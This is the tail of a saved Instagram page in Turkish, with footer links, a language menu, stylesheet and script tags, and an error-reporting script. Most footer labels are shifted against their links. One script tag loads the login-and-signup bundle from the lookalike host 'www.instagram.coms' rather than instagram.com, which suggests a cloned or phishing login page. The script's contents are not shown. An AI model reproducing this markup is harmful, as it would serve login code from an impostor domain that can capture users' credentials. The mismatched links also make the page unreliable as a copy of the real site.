                            <a href="https://about.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Meta</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="https://about.instagram.com/blog/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Hakkında</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/about/jobs/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Blog</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="https://help.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">
İş Fırsatları
</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="https://developers.facebook.com/docs/instagram" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Yardım</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/legal/privacy/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">API</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/legal/terms/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Gizlilik</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/directory/profiles/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Koşullar</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/directory/hashtags/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Başlıca Hesaplar</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/explore/locations/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">
Konu Etiketleri
</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/web/lite/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Konumlar</div></a>
                        </div>
                        <div class="Igw0E IwRSH eGOV_ _4EzTm _22l1 soMvl JI_ht">
                            <a href="/web/lite/"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">Instagram Lite</div></a>
                        </div>
                    </div>
                </div>
                <div class="Igw0E IwRSH YBx95 ybXk5 _4EzTm _22l1 _49XvD">
                    <div class="_7UhW9 PIoXz MMzan KV-D4 uL8Hv">
                        <span class="_3G4x7 RFk-t bwz9f">
                            <div class="TQUPK">
                                <span>Türkçe</span>
                                <div class="Igw0E IwRSH eGOV_ _4EzTm WKY0a">
                                    <span style="display: inline-block; transform: rotate(180deg);">
                                        <svg aria-label="Down Chevron Icon" class="_8-yf5" fill="#8e8e8e" height="12" role="img" viewBox="0 0 48 48" width="12">
                                            <path d="M40 33.5c-.4 0-.8-.1-1.1-.4L24 18.1l-14.9 15c-.6.6-1.5.6-2.1 0s-.6-1.5 0-2.1l16-16c.6-.6 1.5-.6 2.1 0l16 16c.6.6.6 1.5 0 2.1-.3.3-.7.4-1.1.4z"></path>
                                        </svg>
                                    </span>
                                </div>
                            </div>
                            <select aria-label="Switch Display Language" class="hztqj">
                                <option value="af">Afrikaans</option>
                                <option value="cs">Čeština</option>
                                <option value="da">Dansk</option>
                                <option value="de">Deutsch</option>
                                <option value="el">Ελληνικά</option>
                                <option value="en">English</option>
                                <option value="en-gb">English (UK)</option>
                                <option value="es">Español (España)</option>
                                <option value="es-la">Español</option>
                                <option value="fi">Suomi</option>
                                <option value="fr">Français</option>
                                <option value="id">Bahasa Indonesia</option>
                                <option value="it">Italiano</option>
                                <option value="ja">日本語</option>
                                <option value="ko">한국어</option>
                                <option value="ms">Bahasa Melayu</option>
                                <option value="nb">Norsk</option>
                                <option value="nl">Nederlands</option>
                                <option value="pl">Polski</option>
                                <option value="pt-br">Português (Brasil)</option>
                                <option value="pt">Português (Portugal)</option>
                                <option value="ru">Русский</option>
                                <option value="sv">Svenska</option>
                                <option value="th">ภาษาไทย</option>
                                <option value="tl">Filipino</option>
                                <option value="tr">Türkçe</option>
                                <option value="zh-cn">中文(简体)</option>
                                <option value="zh-tw">中文(台灣)</option>
                                <option value="bn">বাংলা</option>
                                <option value="gu">ગુજરાતી</option>
                                <option value="hi">हिन्दी</option>
                                <option value="hr">Hrvatski</option>
                                <option value="hu">Magyar</option>
                                <option value="kn">ಕನ್ನಡ</option>
                                <option value="ml">മലയാളം</option>
                                <option value="mr">मराठी</option>
                                <option value="ne">नेपाली</option>
                                <option value="pa">ਪੰਜਾਬੀ</option>
                                <option value="si">සිංහල</option>
                                <option value="sk">Slovenčina</option>
                                <option value="ta">தமிழ்</option>
                                <option value="te">తెలుగు</option>
                                <option value="vi">Tiếng Việt</option>
                                <option value="zh-hk">中文(香港)</option>
                                <option value="bg">Български</option>
                                <option value="fr-ca">Français (Canada)</option>
                                <option value="ro">Română</option>
                                <option value="sr">Српски</option>
                                <option value="uk">Українська</option>
                            </select>
                        </span>
                    </div>
                    <div class="Igw0E IwRSH eGOV_ _4EzTm _5VUwz"><div class="_7UhW9 PIoXz MMzan _0PwGv uL8Hv">© 2022 Instagram from Meta</div></div>
                </div>
            </div>
        </footer>
    </section>
</div>



        
            <link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.css/a016db3e46a0.css" type="text/css" crossorigin="anonymous">
<link rel="stylesheet" href="https://www.instagram.com/static/bundles/es6/Consumer.css/d44ea27c0066.css" type="text/css" crossorigin="anonymous">
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/Vendor.js/48e0f28aa478.js" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/en_US.js/c0c34e285506.js" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/ConsumerLibCommons.js/9036ca2a19b9.js" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/ConsumerUICommons.js/d548b6ed893f.js" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/ConsumerAsyncCommons.js/c4ca4238a0b9.js" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/Consumer.js/896cb4b625ac.js" crossorigin="anonymous" charset="utf-8" async=""></script>
<script type="text/javascript" src="https://www.instagram.com/static/bundles/es6/FBSignupPage.js/d6ff79e9f739.js" crossorigin="anonymous" charset="utf-8" async=""></script>
<script type="text/javascript" src="https://www.instagram.coms/static/bundles/es6/LoginAndSignupPage.js/492ca17c0097.js" crossorigin="anonymous" charset="utf-8" async=""></script>

            
        

        <script type="text/javascript">
(function(){
  function normalizeError(err) {
    var errorInfo = err.error || {};
    var getConfigProp = function(propName, defaultValueIfNotTruthy) {
      var propValue = window._sharedData && window._sharedData[propName];
      return propValue ? propValue : defaultValueIfNotTruthy;
    };
    var windowUrl = window.location.href;
    var errUrl = err.url || windowUrl;
    return {
      line: err.line || errorInfo.message || 0,
      column: err.column || 0,
      name: 'InitError',
      message: err.message || errorInfo.message || '',
      script: errorInfo.script || '',
      stack: errorInfo.stackTrace || errorInfo.stack || '',
      timestamp: Date.now(),
      ref: windowUrl.indexOf('direct') >= 0 ? 'direct' : windowUrl,
      deployment_stage: getConfigProp('deployment_stage', ''),
      frontend_env: getConfigProp('frontend_env', 'prod'),
      rollout_hash: getConfigProp('rollout_hash', ''),
      is_prerelease: window.__PRERELEASE__ || false,
      bundle_variant: getConfigProp('bundle_variant', null),
      request_url: errUrl.indexOf('direct') >= 0 ? 'direct' : errUrl,
      response_status_code: errorInfo.statusCode || 0
    }
  }
  window.addEventListener('load', function(){
    if (window.__bufferedErrors && window.__bufferedErrors.length) {
      if (window.caches && window.caches.keys && window.caches.delete) {
        window.caches.keys().then(function(keys) {
          keys.forEach(function(key) {
            window.caches.delete(key)
          })
        })
      }
      window.__bufferedErrors.map(function(error) {
        return normalizeError(error)
      }).forEach(function(normalizedError) {
        var request = new XMLHttpRequest();
        request.open('POST', '/client_error/', true);
        request.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        request.send(JSON.stringify(normalizedError));
      })
    }
  })
}());
</script>
    

<div class="_-rjm"><div class="tA2fc "></div></div><div class="_5qKD1"><div class="q5edG "></div></div><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div></body></html>